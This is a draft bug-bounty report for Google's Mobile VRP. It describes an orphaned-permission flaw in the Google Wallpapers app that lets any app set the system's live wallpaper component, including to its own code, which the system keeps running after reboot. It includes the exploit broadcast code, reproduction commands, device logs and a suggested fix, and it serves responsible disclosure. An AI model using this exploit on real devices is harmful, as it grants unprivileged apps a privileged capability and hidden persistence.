# G-F004 — Google Wallpapers: any app can choose the live wallpaper component

**Status:** draft, not submitted
**Target:** Google Mobile VRP
**Package:** `com.google.android.apps.wallpaper` (GoogleWallpapers, privileged, versionName 16)
**Category:** orphaned permission (listed under "other" in the program rules)
**CVSS 3.1:** 4.3 Medium — `AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N`

---

## FILL BEFORE SUBMITTING

- [ ] external IP: run `curl -s ifconfig.me` on the Pi and put it in **Researcher**
- [ ] screenshot of the terminal showing the control run and the attacker run
- [ ] attach `poc/wallpaper-restore-poc/` as a zip (sources + the three manifests)
- [ ] re-read: does any sentence claim something not in the pasted output?

---

## Problem description

`com.google.android.apps.wallpaper` exports a broadcast receiver that is
guarded by a permission no package on the device defines:

```xml
<receiver android:name="com.google.android.apps.wallpaper.module.DownloadableRestorer"
          android:permission="com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER"
          android:exported="true">
    <intent-filter>
        <action android:name="com.google.android.apps.wallpaper.action.RESTORE_DOWNLOADABLE"/>
    </intent-filter>
</receiver>
```

A permission that nothing defines can be defined by any app, at
`protectionLevel="normal"`, and is then granted to it at install with no
prompt and no user interaction. So the guard stops nobody.

What the receiver does with the broadcast (decompiled from the APK on the
device):

```java
Object extra  = intent.getExtra("android.live_wallpaper.info");
int    target = intent.getIntExtra("android.live_wallpaper.restore_target", 0);
LiveWallpaperInfo info = new LiveWallpaperInfo((WallpaperInfo) extra);
...
WallpaperSetter.setWallpaperComponent(wallpaperManager, info, target);
```

and that helper:

```java
public static void setWallpaperComponent(WallpaperManager wallpaperManager,
                                         LiveWallpaperInfo liveWallpaperInfo, int i) {
    wallpaperManager.setWallpaperComponentWithFlags(
            liveWallpaperInfo.mInfo.getComponent(), WallpaperPersister.destinationToFlags(i));
    ...
}
```

`setWallpaperComponent` and `setWallpaperComponentWithFlags` require
`android.permission.SET_WALLPAPER_COMPONENT`, which is `signature|privileged`.
The Wallpapers app is privileged and holds it. A normal app cannot.

The `ComponentName` handed to that API comes straight out of an extra supplied
by whoever sent the broadcast. Nothing checks who sent it — the
`Intrinsics.checkNotNull` on the extra tests the cast, not the sender.

So an app that holds no real permission can make a privileged app perform a
`signature|privileged` action with an argument of the attacker's choosing.

## Reproduction

Two APKs, built from one source tree. They differ in one thing: whether the
manifest declares the orphaned permission. Same code, same broadcast, same
target component.

```
export ANDROID_SERIAL=<device>
F=com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService

adb install -r out/control/com.cindrasec.wallpaperctl.apk
adb install -r out/attacker/com.cindrasec.wallpaperpoc.apk

./run-poc.sh control  "$F"
./run-poc.sh attacker "$F"
```

`run-poc.sh` records the wallpaper component, launches the build, polls
`dumpsys wallpaper` until the requested component appears or 45 seconds pass,
and prints both the app's log and the framework's.

The attacker app's whole request is:

```java
Intent b = new Intent("com.google.android.apps.wallpaper.action.RESTORE_DOWNLOADABLE");
b.setComponent(new ComponentName("com.google.android.apps.wallpaper",
        "com.google.android.apps.wallpaper.module.DownloadableRestorer"));
b.putExtra("android.live_wallpaper.info", wallpaperInfo);   // any installed wallpaper service
b.putExtra("android.live_wallpaper.restore_target", 0);
sendBroadcast(b);
```

## Evidence

Device: moto g (2026), Android 16, serial ZT422724JR. Both runs started from
the same state: the default static wallpaper.

**Control — same code, no permission:**

```
# when   : 2026-10-22T20:39:24Z
# device : moto g - 2026 / Android 16
# build  : control (com.cindrasec.wallpaperctl)

before : ComponentInfo{com.android.systemui/com.android.systemui.wallpapers.ImageWallpaper}
asked  : ComponentInfo{com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService}
after  : ComponentInfo{com.android.systemui/com.android.systemui.wallpapers.ImageWallpaper}      (waited 45s of 45s)

  I WPPOC   :   held by me: false
  I WPPOC   :   SET_WALLPAPER_COMPONENT held by me: false
  I WPPOC   : asking for component com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService, restore_target=0
  I WPPOC   : broadcast sent to com.google.android.apps.wallpaper/com.google.android.apps.wallpaper.module.DownloadableRestorer

RESULT  unchanged after 45s
```

The Wallpapers app's process was never started and the framework logged
nothing. The broadcast is dropped silently — the sender is told nothing and no
`Permission Denial` line appears anywhere in unfiltered logcat.

**Attacker — same code, with the self-declared permission:**

```
# when   : 2026-10-22T20:40:14Z
# device : moto g - 2026 / Android 16
# build  : attacker (com.cindrasec.wallpaperpoc)

before : ComponentInfo{com.android.systemui/com.android.systemui.wallpapers.ImageWallpaper}
asked  : ComponentInfo{com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService}
after  : ComponentInfo{com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService}      (waited 2s of 45s)

  I WPPOC   :   held by me: true
  I WPPOC   :   SET_WALLPAPER_COMPONENT held by me: false
  I WPPOC   : asking for component com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService, restore_target=0
  I WPPOC   : broadcast sent to com.google.android.apps.wallpaper/com.google.android.apps.wallpaper.module.DownloadableRestorer

  I ActivityManager      : Start proc 20099:com.google.android.apps.wallpaper/u0a394
        for broadcast {com.google.android.apps.wallpaper/com.google.android.apps.wallpaper.module.DownloadableRestorer}
  V WallpaperManagerService: setWallpaperComponent
        name=ComponentInfo{com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService},
        which = 1; callingPid = 20099
  V WallpaperManagerService: bindWallpaperComponentLocked:
        componentName=ComponentInfo{com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService}; Which = 1

RESULT  the requested component is now the home wallpaper (after 2s)
```

`callingPid = 20099` is the Wallpapers app process started one line earlier for
this broadcast. That is the framework's own record of a privileged app making
the `SET_WALLPAPER_COMPONENT`-gated call with a component chosen by an app
that does not hold that permission.

The permission really is granted at install, from the device's records:

```
$ adb shell dumpsys package com.cindrasec.wallpaperpoc | grep -A3 'install permissions'
    install permissions:
      com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER: granted=true
```

**The component can be the attacker's own code.** A third build adds a
`WallpaperService` to the same app and points the receiver at it:

```
before : ComponentInfo{com.android.systemui/com.android.systemui.wallpapers.ImageWallpaper}
after  : ComponentInfo{com.cindrasec.wallpapercan/com.cindrasec.wallpaperpoc.CanaryWallpaperService}

  I WPPOC   : canary engine created by the system: uid=10541 pid=16798
  D WallpaperManagerService: WPMS.onServiceConnected-ComponentInfo{com.cindrasec.wallpapercan/...CanaryWallpaperService}
  D WallpaperManagerService: WPMS.connectLocked-ComponentInfo{com.cindrasec.wallpapercan/...CanaryWallpaperService}
```

That service is started by the system, in the attacker's own process, without
the user choosing it. It survives a reboot: after `adb reboot`,
`dumpsys wallpaper` still reported the canary as the home wallpaper, so the
system starts the attacker's code again at every boot.

Also reproduced on moto g stylus 5G (2024), Android 15, serial ZD222W5X3R —
same result, including the canary engine starting.

## Impact

An app that holds no permission a user would ever be asked about gains a
capability that is `signature|privileged`:

- It chooses which `WallpaperService` the system runs, including its own. The
  system then starts that service and restarts it at boot, which gives the app
  a long-running process it is not otherwise entitled to, with no foreground
  service notification and no user involvement.
- It can replace the user's wallpaper with any installed wallpaper service.
- The wallpaper surface is full-screen behind the home screen, so whatever the
  attacker's engine draws is displayed there.

The user installs the app; nothing else is asked of them, and they are not
prompted at any point.

## What I did not demonstrate

- **No lock screen.** `restore_target=2` changed only the home-screen entry.
  The app clears the lock screen when the device has no lock-screen live
  wallpaper (`if (!isLockscreenLiveWallpaperEnabled() && i == 2) clear(2)`), so
  on this device the lock screen is not reachable this way.
- **No access to anyone's data.** Nothing was read from any other app, and the
  test wallpaper draws one flat colour.
- **Not silent.** The wallpaper visibly changes, so a user looking at the home
  screen can see that something happened.
- **Pixel behaviour unknown.** The permission name suggests it is defined by
  `com.google.pixel.livewallpaper`, which is not installed on either device I
  tested. I have not checked a Pixel, so I cannot say whether the guard works
  there.

## Root cause and suggested fix

The receiver depends on a permission defined by a package that is not present
on these devices, so the declared guard has no effect: any app can define the
name itself at `normal` and be granted it.

Two things would need to change:

1. The receiver should not be exported, or should be guarded by a permission
   the Wallpapers app itself defines at `signature`, so the name cannot be
   claimed by a third party.
2. The handler should not pass a caller-supplied `ComponentName` to
   `setWallpaperComponentWithFlags`. If the restore path must accept one, it
   should verify the sending package before acting on it.

## Researcher

- Md. Azmol Haque Rony — azmolhaque95@gmail.com — handle `cindrasec`
- Tested 2026-10-22/23 (UTC), from external IP `FILL ME`
- Devices: moto g (2026) Android 16 `ZT422724JR`; moto g stylus 5G (2024)
  Android 15 `ZD222W5X3R`. Both unrooted, both with the stock preinstalled
  `com.google.android.apps.wallpaper` (`/system_ext/priv-app/GoogleWallpapers`,
  versionName 16).
- Tools: adb, apktool/jadx for reading the installed APK, and the PoC in
  `poc/wallpaper-restore-poc/` built with javac + d8 + aapt2 + apksigner.
